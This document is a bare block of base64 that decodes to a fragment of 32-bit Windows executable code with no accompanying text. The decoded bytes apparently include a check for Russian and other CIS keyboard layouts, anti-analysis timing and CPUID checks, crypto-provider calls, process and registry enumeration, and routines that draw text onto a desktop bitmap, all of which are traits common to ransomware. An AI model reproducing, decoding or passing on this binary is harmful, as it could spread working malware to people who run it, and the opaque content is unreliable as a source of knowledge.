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nRTagZZM8CJdciNfczzq41FyFBqAVL/FRz+ABCLffRXhcB0K/8VAP4AEIXAdCCLfeyLRfCDxyxAiX3siUXwO0X4D4Ju////6wwzwEDrmVf/FZz+ABAz9kZT/xWc/gAQi8ZfXluL5V3DVYvsgexUAQAAVv91COhkIQAAjQRFAAgAAFDoaQoAAIvwWVmF9g+ECwQAAFNXjYXY/v//u2DwABBQahBqC2imAgAAU+jeHAAAM8BmiYXo/v//jYXY/v//UFbobyAAAP91CFbooh8AAGgYwAAQVuiXHwAAjYWs/v//UGoUagxoJwUAAFPonhwAAIPEQDPAZomFwP7//42FTP///1BqDGoHX1doqgUAAFPoehwAADPAZomFWP///42FHP///1BqDmoJaJMKAABT6FscAAAzwGaJhSr///+NhQz///9Qag5XaMUAAABT6D0cAAAzwGaJhRr///+Nhfz+//9Qag5qBWjnAAAAU+geHAAAg8RQM8BmiYUK////jUWkUGoIW1NXaCIHAABoYPAAEOj6GwAAM8BmiUWsjUWYUFNqEGgdCwAAaGDwABDo3hsAADPAZolFoI2FaP///1BqCldo0gkAAGhg8AAQ6L8bAAAzwGaJhXL///+Nhaz+//+JRdSNhUz///+JRdiNhRz///+JRdyNhQz///+JReCNhfz+//+JReSNRaSJReiNRZiJReyNhWj///9XagCJRfDoeBQAAIPERP90hdRW6EIeAAC/GMAAEFdW6DYeAACNhTz///9QagxqBGgfAgAAaGDwABDoORsAADPAZomFSP///42FxP7//1BqEGoGaA0BAABoYPAAEOgWGwAAM8BmiYXU/v//jYVc////UGoKagpo/gIAAGhg8AAQ6PMaAACDxEwzwGaJhWb///+NRYxQU2oPaFIFAABoYPAAEOjRGgAAM8BmiUWUjUXIUGoGagRojAUAAGhg8AAQ6LQaAAAzwGaJRc6Nhez+//9Qag5TaGMCAABoYPAAEOiVGgAAM8BmiYX6/v//jYUs////UGoMagZocgEAAGhg8AAQ6HIaAACDxFAzwGaJhTj///+NRYBQU1NougYAAGhg8AAQ6FEaAAAzwGaJRYiNhXT///9QU2oOaPEJAABoYPAAEOgyGgAAM8BmiYV8////jYU8////iUXQjYXE/v//iUXUjYVc////iUXYjUWMi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